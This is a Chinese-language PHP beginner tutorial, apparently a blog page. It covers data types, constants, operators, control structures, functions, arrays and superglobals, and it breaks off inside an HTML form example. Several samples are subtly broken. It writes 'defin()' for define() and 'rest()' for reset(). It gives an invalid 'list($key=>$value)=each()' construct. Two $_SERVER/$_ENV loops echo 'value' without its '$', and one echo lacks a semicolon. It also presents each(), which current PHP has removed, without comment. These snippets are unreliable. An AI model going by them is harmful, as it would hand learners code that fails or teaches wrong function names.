<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class Person&#123;</span><br><span class="line">	var $name;</span><br><span class="line">	</span><br><span class="line">	function say()&#123;</span><br><span class="line">		echo &quot;Doing foo&quot;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$p=new Person;</span><br><span class="line">	</span><br><span class="line">	$p-&gt;name=&quot;Tom&quot;;</span><br><span class="line">	$p-&gt;say();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="null类型">NULL类型</span></h3><p>特殊的NULL值表示一个变量没有值，NULL类型唯一可能的值就是NULL。NULL不表示空格，也不表示零，也不是空字符串，而是表示一个变量的值为空。NULL不区分大小写，在下列情况下一个变量被认为是NULL：</p>
<ul>
<li>将变量直接赋值为NULL</li>
<li>声明的变量尚未被赋值</li>
<li>被unset()函数销毁的变量</li>
</ul>
<h3><span id="伪类型介绍">伪类型介绍</span></h3><ul>
<li>mixed:说明一个参数可以接受多种不同的类型。</li>
<li>number:说明一个参数可以是intger或者是float</li>
<li>callback:</li>
</ul>
<h2><span id="常量">常量</span></h2><h3><span id="常量的定义和使用">常量的定义和使用</span></h3><p>在PHP中是通过使用defin()函数来定义常量的。大小写敏感.遵循PHP标识符的命名规则。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	define(&quot;name&quot;，value)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="预定义常量">预定义常量</span></h3><p>PHP预定于了一系列常量，可以在程序中直接使用来完成一些特殊的功能。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> echo &apos;PHP常用的预定义常量&apos;.&apos;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line"> </span><br><span class="line"> echo &apos;当前php的版本为(PHP_VERSION):&apos;.PHP_VERSION.&apos;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">  </span><br><span class="line"> echo &apos;当前所使用的操作系统类型(PHP_OS):&apos;.PHP_OS.&apos;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">  </span><br><span class="line"> echo &apos;web服务器与PHP之间的接口为(PHP_SAPI):&apos;.PHP_SAPI.&apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">  </span><br><span class="line"> echo &apos;最大的整型数(PHP_INT_MAX):&apos;.PHP_INT_MAX.&apos;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">  </span><br><span class="line"> echo &apos;php默认的包含路径(DEFAULT_INCLUDE_PATH):&apos;.DEFAULT_INCLUDE_PATH.&apos;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">  </span><br><span class="line"> echo &apos;pear的安装路径(PEAR_INSTALL_DIR):&apos;.PEAR_INSTALL_DIR.&apos;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">  </span><br><span class="line"> echo &apos;pear的扩展路径(PEAR_EXTENSION_DIR):&apos;.PEAR_EXTENSION_DIR.&apos;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">  </span><br><span class="line"> echo &apos;php的执行路径(PHP_BINDIR):&apos;.PHP_BINDIR.&apos;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">  </span><br><span class="line"> echo &apos;php扩展模块的路径为(PHP_LIBDIR):&apos;.PHP_LIBDIR.&apos;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">  </span><br><span class="line"> echo &apos;指向最近的错误处(E_ERROR):&apos;.E_ERROR.&apos;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">  </span><br><span class="line"> echo &apos;指向最近的警告处(E_WARNING):&apos;.E_WARNING.&apos;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">  </span><br><span class="line"> echo &apos;指向最近的注意处(E_NOTICE):&apos;.E_NOTICE.&apos;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">  </span><br><span class="line"> echo &apos;自然对数e值(M_E):&apos;.M_E.&apos;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">  </span><br><span class="line"> echo &apos;数学上的圆周率的值(M_PI):&apos;.M_PI.&apos;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line"> echo &apos;逻辑真值(TRUE):&apos;.TRUE.&apos;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">  </span><br><span class="line"> echo &apos;逻辑假值(FALSE):&apos;.FALSE.&apos;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">  </span><br><span class="line"> echo &apos;当前文件行数(__LINE__):&apos;.__LINE__.&apos;&lt;br&gt;&lt;br&gt;&apos;; //是两个下划线</span><br><span class="line">  </span><br><span class="line"> echo &apos;当前文件路径名(__FILE__):&apos;.__FILE__.&apos;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line"> </span><br><span class="line"> echo &apos;&lt;br&gt;&apos;.&apos;当前被调用的函数名(__FUNCTION__):&apos;.__FUNCTION__.&apos;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">  </span><br><span class="line"> echo &apos;类名(__CLASS__):&apos;.__CLASS__.&apos;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">  </span><br><span class="line"> echo &apos;类的方法名(__METHOD__):&apos;.__METHOD__.&apos;&lt;br&gt;&lt;br&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2><span id="php中的运算符">PHP中的运算符</span></h2><h3><span id="类型">类型</span></h3><ul>
<li>算术运算符</li>
<li>字符串运算符</li>
<li>赋值运算符</li>
<li>比较运算符</li>
<li>逻辑运算符</li>
<li>位运算符</li>
<li>其他运算符</li>
</ul>
<h4><span id="字符串运算符">字符串运算符</span></h4><p>在PHP中字符串运算符只有一个，是英文的句号（“.”），也叫做连接运算符</p>
<h4><span id="其他运算符">其他运算符</span></h4><ul>
<li>三元运算符（?:）提供简单的逻辑判断</li>
<li>执行判断符（``）执行操作系统命令，并将其输出信息返回</li>
<li>错误控制运算符（@）当将其放置在一个PHP表达式之前，该表达式可能产生的任何警告信息都会被忽略。</li>
</ul>
<h1><span id="php语言结构">PHP语言结构</span></h1><h2><span id="分支结构">分支结构</span></h2><p>在程序中使用分支结构可以有以下几种形式：</p>
<ul>
<li>单一条件分支结构</li>
<li>双向条件分支结构</li>
<li>多向条件分支结构</li>
<li>巢状条件分支结构</li>
</ul>
<h3><span id="单一条件分支结构if">单一条件分支结构（if）</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(表达式)</span><br><span class="line">	语句块;</span><br></pre></td></tr></table></figure>
<h3><span id="双向条件分支结构else子句">双向条件分支结构（else子句）</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(表达式)</span><br><span class="line">	语句块1;</span><br><span class="line">else</span><br><span class="line">	语句块2;</span><br></pre></td></tr></table></figure>
<h3><span id="多向条件分支结构elseif子句">多向条件分支结构（elseif子句）</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if(表达式1)</span><br><span class="line">	语句块1;</span><br><span class="line">elseif(表达式2)</span><br><span class="line">	语句块2;</span><br><span class="line">	</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">elseif(表达式n)</span><br><span class="line">	语句块n;</span><br><span class="line">else </span><br><span class="line">	语句块n+1</span><br></pre></td></tr></table></figure>
<h3><span id="多向条件分支结构switch语句">多向条件分支结构（switch语句）</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">switch(表达式)</span><br><span class="line">&#123;</span><br><span class="line">	case 值1：</span><br><span class="line">		语句块1;</span><br><span class="line">		break;</span><br><span class="line">	case 值2;</span><br><span class="line">		语句块2;</span><br><span class="line">	</span><br><span class="line">	.....</span><br><span class="line">	</span><br><span class="line">	case 值n;</span><br><span class="line">		语句块n;</span><br><span class="line">		break;</span><br><span class="line">	default:</span><br><span class="line">		语句块n+1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="巢状条件分支结构">巢状条件分支结构</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if(表达式1)&#123;</span><br><span class="line">	if(表达式2)&#123;</span><br><span class="line">	... ...</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">	... ...</span><br><span class="line">	&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	if(表达式2)&#123;</span><br><span class="line">	... ...</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">	... ...</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2><span id="循环结构">循环结构</span></h2><p>PHP中提供三种循环</p>
<ul>
<li>while循环</li>
<li>do-while循环</li>
<li>for循环</li>
</ul>
<h3><span id="while语句">while语句</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">while(表达式)</span><br><span class="line">	语句块;</span><br></pre></td></tr></table></figure>
<h3><span id="dowhile循环">do…while循环</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">do&#123;</span><br><span class="line">	语句块;</span><br><span class="line">&#125;while(表达式);</span><br></pre></td></tr></table></figure>
<h3><span id="for语句">for语句</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for(初始化:条件表达式; 增量)&#123;</span><br><span class="line">	语句块;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2><span id="php中的函数">PHP中的函数</span></h2><h3><span id="函数声明">函数声明</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function 函数名 ([参数1, 参数2,... 参数n])</span><br><span class="line">&#123;</span><br><span class="line">	函数体;</span><br><span class="line">	return 返回值;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="参数的传递">参数的传递</span></h3><ul>
<li><p>按值传递参数<br>通过参数列表传递信息到函数</p>
</li>
<li><p>按引用传递参数<br>在参数的面前预先加上符号“&amp;”即可</p>
</li>
<li><p>函数的默认参数</p>
</li>
<li><p>可变长度参数列表<br>使用func_get_args()函数将所有传递给脚本函数的参数当做一个数组返回<br>也可以使用func_num_args()函数返回参数的总数，和使用func_get_arg()函数接收一个数字参数，返回指定的函数。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function more_args()&#123;</span><br><span class="line">		$args=func_get_args();</span><br><span class="line">	for($i=0;$i&lt;count($args);$i++)&#123;</span><br><span class="line">		echo &quot;第&quot;.$i.&quot;个参数是&quot;.$args[$i].&quot;&lt;br&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	more_args(&quot;one&quot;,&quot;two&quot;,&quot;three&quot;,1,2,3);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	function more_args()&#123;</span><br><span class="line">	for($i=0;$i&lt;func_num_args();$i++)&#123;</span><br><span class="line">		echo &quot;第&quot;.$i.&quot;个参数是&quot;.func_get_arg($i).&quot;&lt;br&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	more_args(&quot;one&quot;,&quot;two&quot;,&quot;three&quot;,1,2,3);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="变量函数">变量函数</span></h3><p>变量函数也称作可变函数。如果一个变量名后有圆括号，PHP将寻找与变量的值同名的函数，并且将尝试执行它。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function one($a,$b)&#123;</span><br><span class="line">	return $a+$b;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$result=&quot;one&quot;;</span><br><span class="line">	echo &quot;通算结果是：&quot;.$result(2,3);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h1><span id="php中的数组与数据结构">PHP中的数组与数据结构</span></h1><h2><span id="数组的概述">数组的概述</span></h2><h3><span id="数组的分类">数组的分类</span></h3><p>在PHP中，根据数组提供下标的不同方式，将数组分为索引数组和关联数组</p>
<ul>
<li>索引数组的索引值是整数</li>
<li>关联数组的索引值是字符串</li>
</ul>
<h2><span id="数组的定义">数组的定义</span></h2><h3><span id="直接复制的方式声明数组">直接复制的方式声明数组</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$数组变量名[索引值]=资料内容</span><br></pre></td></tr></table></figure>
<p>可以使用print_r()或者var_dump()函数打印数组中所有元素的内容。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r($contact1);			//输出数组$contact1中所有元素的下标和值</span><br><span class="line">var_dump($contact1);		//输出数组$contact1中所有元素的下标和值，同时输出每个元素的类型</span><br></pre></td></tr></table></figure>
<p>在声明数组变量时，还可以在下标中使用数字和字符串混合。<br>在PHP中，索引数组的下标可以是非连续的值，只要在初始化时指定非连续的下标即可。如果指定的下标志已经声明过，则属于对变量重新赋值。如果没有指定索引值的元素与指定索引值的元素混在一起赋值时，没有指定索引值的元素的默认索引值，将紧跟指定索引值元素中的最高的索引值递增，</p>
<h3><span id="使用array语言结构新建数组">使用array()语言结构新建数组</span></h3><p>语法格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$数组变量名=array(key1=&gt;value,key2=&gt;value, ... ... keyN=&gt;valueN);</span><br></pre></td></tr></table></figure></p>
<h3><span id="多维数组的声明">多维数组的声明</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">       //使用array()语句结构将联系人列表中所有数据声明为一个二维数组，默认下标是顺序数字索引</span><br><span class="line">$contact = array(                                                     //定义外层数组</span><br><span class="line">	   array(1, &apos;高某&apos;, &apos;A公司&apos;, &apos;北京市&apos;, &apos;(010)98765432&apos;, &apos;gm@linux.com&apos;),   //子数组1</span><br><span class="line">	   array(2, &apos;洛某&apos;, &apos;B公司&apos;, &apos;上海市&apos;, &apos;(021)12345678&apos;, &apos;lm@apache.com&apos;),  //子数组2</span><br><span class="line">	   array(3, &apos;峰某&apos;, &apos;C公司&apos;, &apos;天津市&apos;, &apos;(022)24680246&apos;, &apos;fm@mysql.com&apos;),   //子数组3</span><br><span class="line">	   array(4, &apos;书某&apos;, &apos;D公司&apos;, &apos;重庆市&apos;, &apos;(023)13579135&apos;, &apos;sm@phpcom&apos;)       //子数组4</span><br><span class="line">   );</span><br></pre></td></tr></table></figure>
<h2><span id="数组的遍历">数组的遍历</span></h2><h3><span id="使用for语句循环遍历数组">使用for语句循环遍历数组</span></h3><p>在PHP中，不仅可以指定非连续的数字索引值，而且还存在以字符串为下标的关联数组。所以在PHP中很少使用for语句循环遍历数组。</p>
<h3><span id="使用foreach语句遍历数组">使用foreach语句遍历数组</span></h3><ul>
<li>第一种语法格式：<br>每次循环中，当前元素的值被赋给变量$value($value可以是自定义的任意变量)，并且把数组内部的指针向后移动一步，因此下一次循环中将会得到该数组的下一个元素，只要数组的结尾停止循环，结束数组的遍历。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">foreach(array_expression as $value)&#123;</span><br><span class="line">	循环体</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">        //使用array()结构声明一个无序的一维数组$contact</span><br><span class="line">	$contact = array( 1, 14=&gt;&quot;高某&quot;, &quot;A公司&quot;, &quot;北京市&quot;, 14=&gt;&quot;(010)98765432&quot;, &quot;gao@php.com&quot; );</span><br><span class="line">	$num=0;                                                       //声明一个变量$num初使值为0，做为循环的计数使用</span><br><span class="line">        //使用foreach语句遍历一维数组$contact，将数组中每个元素输出</span><br><span class="line">	foreach($contact as $value)&#123;</span><br><span class="line">		echo &quot;在数组\$contact中第 $num 元素是：$value &lt;br&gt;&quot;;  //每次循环输出一次当前元素</span><br><span class="line">		$num++;                                               //计数变量累加</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">在数组$contact中第 0 元素是：1</span><br><span class="line">在数组$contact中第 1 元素是：(010)98765432</span><br><span class="line">在数组$contact中第 2 元素是：A公司</span><br><span class="line">在数组$contact中第 3 元素是：北京市</span><br><span class="line">在数组$contact中第 4 元素是：gao@php.com</span><br></pre></td></tr></table></figure>
<ul>
<li>第二种语法格式<br>当前元素的键名和值都会被赋给变量$key和$value<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">foreach(array_expression as $key=&gt;$value)&#123;</span><br><span class="line">	循环体</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">        //声明一个一维的关联数组$contact, 使用“=&gt;”运算符指定了每个元素的字符串下标</span><br><span class="line">	$contact = array(&quot;ID&quot; =&gt; 1,</span><br><span class="line">		&quot;姓名&quot; =&gt; &quot;高某&quot;,</span><br><span class="line">		&quot;公司&quot; =&gt; &quot;A公司&quot;,</span><br><span class="line">		&quot;地址&quot; =&gt; &quot;北京市&quot;,</span><br><span class="line">		&quot;电话&quot; =&gt; &quot;(010)98765432&quot;,</span><br><span class="line">		&quot;EMAIL&quot; =&gt; &quot;gao@php.com&quot; </span><br><span class="line">	);</span><br><span class="line">	//以HTML列表的方式输出数组中每个元素的信息</span><br><span class="line">	echo &apos;&lt;dl&gt;一个联系人信息：&apos;;</span><br><span class="line">	foreach($contact as $key =&gt; $value)&#123;       //使用foreach的第二种格式，可以获取数组元素的键/值</span><br><span class="line">		echo &quot;&lt;dd&gt; $key : $value &lt;/dd&gt;&quot;;   //输出每个元素的键/值对</span><br><span class="line">	&#125;</span><br><span class="line">	echo &apos;&lt;/dl&gt;&apos;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">一个联系人信息：</span><br><span class="line">    ID : 1 </span><br><span class="line">    姓名 : 高某 </span><br><span class="line">    公司 : A公司 </span><br><span class="line">    地址 : 北京市 </span><br><span class="line">    电话 : (010)98765432 </span><br><span class="line">    EMAIL : gao@php.com</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3><span id="联合使用list-each和while循环遍历数组">联合使用list()、each()和while()循环遍历数组</span></h3><ul>
<li><p>each()函数<br>each()函数需要传递一个数组作为参数，返回数组中当前元素的键/值对，并向后移动数组指针到下一个元素的位置。</p>
</li>
<li><p>list()函数<br>list()用一步操作给一组变量进行赋值，即把数组中的值赋给一些变量。list()仅能用与数字索引从0开始。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list(mixed varname,mixed ...)=array_expression     //list()语句的语法格式</span><br></pre></td></tr></table></figure>
<p>list()是通过“=”运算符以赋值的方式，将数组中每个元素的值，对应的赋给list()函数中的每个参数。list()函数又将它中的每个参数转换成直接可以在脚本中使用的比变量。</p>
<ul>
<li>each()和list()结合<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$contact=array(&quot;ID&quot;=&gt;1,&quot;名字&quot;=&gt;&quot;高某&quot;,&quot;公司&quot;=&gt;&quot;A&quot;);</span><br><span class="line">	list($key=&gt;$value)=each($contact);</span><br><span class="line">	echo &quot;$key=&gt;$value&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3><span id="使用数组的内部指针控制函数遍历数组">使用数组的内部指针控制函数遍历数组</span></h3><p>数组的内部指针是数组内部的组织机制，指向一个数组中的某个元素，默认是指向数组中第一个元素，通过移动或改变指针的位置，可以访问数组中的任意元素。<br>对于数组指针的控制PHP提供以下几个内建函数可以利用。</p>
<ul>
<li>current():是取得目前指针位置的内容资料</li>
<li>key():用来读取目前指针所指向资料的索引值</li>
<li>next():将数组中的内部指针移动到下一个单元</li>
<li>prev():将数组的内部指针倒回一位</li>
<li>end():将数组的内部指针指向最后一个元素</li>
<li>rest():将目前指针无条件移至第一个索引位置</li>
</ul>
<h2><span id="预定义数组">预定义数组</span></h2><table>
<thead>
<tr>
<th>预定义数组</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>$_SERVER</td>
<td style="text-align:left">变量由Web服务器设定或者直接与当前脚本的执行环境相关联</td>
</tr>
<tr>
<td>$_ENV</td>
<td style="text-align:left">执行环境提交至脚本的变量</td>
</tr>
<tr>
<td>$_GET</td>
<td style="text-align:left">经由URL请求提交至脚本的变量</td>
</tr>
<tr>
<td>$_POST</td>
<td style="text-align:left">经由HTTP POST方法提交至脚本的变量</td>
</tr>
<tr>
<td>$_REQUEST</td>
<td style="text-align:left">经由GET,POST和COOKIE机制提交至脚本的变量，因此该数组并不值得信任</td>
</tr>
<tr>
<td>$_FILES</td>
<td style="text-align:left">经由HTTP POST文件上传而提交至脚本的变量</td>
</tr>
<tr>
<td>$_COOKIE</td>
<td style="text-align:left">经由HTTP Cookies方法提交至脚本的变量</td>
</tr>
<tr>
<td>$_SESSION</td>
<td style="text-align:left">当前注册给脚本会话的变量</td>
</tr>
<tr>
<td>$GLOBALS</td>
<td style="text-align:left">包含一个引用指向每个当前脚本的全局范围内有效的变量。该数组的键名为全局变量的名称</td>
</tr>
</tbody>
</table>
<h3><span id="服务器变量_server">服务器变量：$_SERVER</span></h3><p>$_SERVER是一个包含诸如头信息，路径和脚本位置的数组。这是自动全局变量，在所有的脚本中都有效，在函数或对象的方法中不需要使用global关键字访问它。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	foreach($_SERVER as $key=&gt;$value)&#123;</span><br><span class="line">		echo &apos;$_SERVER[&apos;.$key.&apos;]=&apos;.value.&apos;&lt;br&gt;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="环境变量_env">环境变量：$_ENV</span></h3><p>$_ENV数组中的内容是在PHP解析器运行是，从PHP所在服务器中的环境变量转变为PHP全局变量的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	foreach($_ENV as $key=&gt;$value)&#123;</span><br><span class="line">		echo &apos;$_ENV[&apos;.$key.&apos;]=&apos;.value.&apos;&lt;br&gt;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>###　HTTP GET变量：$_GET<br>$_GET数组也是超全局变量数组，是通过HTTP GET方法传递的变量组成的数组。它属于外部变量，即在服务器页面中通过$_GET超全局数组获取URL或表单的GET方式传递过来的参数。</p>
<h3><span id="http-post变量_post">HTTP POST变量：$_POST</span></h3><p>$_POST数组也是超全局变量数组，通过HTTP POST方法传递的变量组成的数组，是自动全局变量，在所有的脚本中都有效，在函数或对象的方法也不需要使用global关键字访问它。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;&lt;title&gt;添加联系人&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;form action=&quot;add.php&quot; method=&quot;post&quot;&gt; &lt;!--将表单以POST方法提交到add.php页面 --&gt;</span><br><span class="line">			编号：&lt;input type=&quot;text&quot; name=&quot;id&quot;&gt;&lt;br&gt;        &lt;!-- 表单域的名称为id --&gt;</span><br><span class="line">			姓名：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;&lt;br&gt;      &lt;!-- 表单域的名称为name --&gt;</span><br><span class="line">			公司：&lt;input type=&quot;text&quot; name=&quot;company&quot;&gt;&lt;br&gt;   &lt;!-- 